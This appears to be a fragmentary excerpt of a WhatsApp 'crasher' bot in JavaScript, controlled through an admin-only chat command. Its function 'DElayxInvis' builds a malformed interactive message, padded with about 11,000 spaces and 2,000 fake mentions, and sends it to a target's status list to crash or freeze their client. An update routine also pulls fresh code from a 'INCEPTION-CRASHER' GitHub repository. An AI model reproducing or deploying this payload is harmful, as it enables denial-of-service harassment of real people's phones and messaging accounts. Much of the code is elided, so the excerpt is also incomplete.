...
bot.command("/ziperr", checkAdmin, async (ctx) => {
...
async function DElayxInvis(sock, target) {
  const Konyol = [
    {
      viewOnceMessage: {
        message: {
    ...
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          ...
          nativeFlowResponseMessage: {
            name: "menu_options", 
            paramsJson: `{\"display_text\":\"${" ".repeat(11111)}\",\"id\":\".grockk\",\"description\":\"Xwrcvzz.\"}`, 
            version: 3
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, z) => `1313555020${z + 1}@s.whatsapp.net`), 
  ...
  await sock.relayMessage("status@broadcast", konyol2, {
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
...
const GITHUB_RAW_URL = "https://raw.githubusercontent.com/ziperrdev/INCEPTION-CRASHER/main/INCEPTION.js";
...
async function updateBot() {
  try {
    ...
    if (remote !== local) {
      ...
      console.log(`✅ CEK UPDATE TO - ${new Date().toLocaleTimeString()}`);
    }
  } catch (err) {
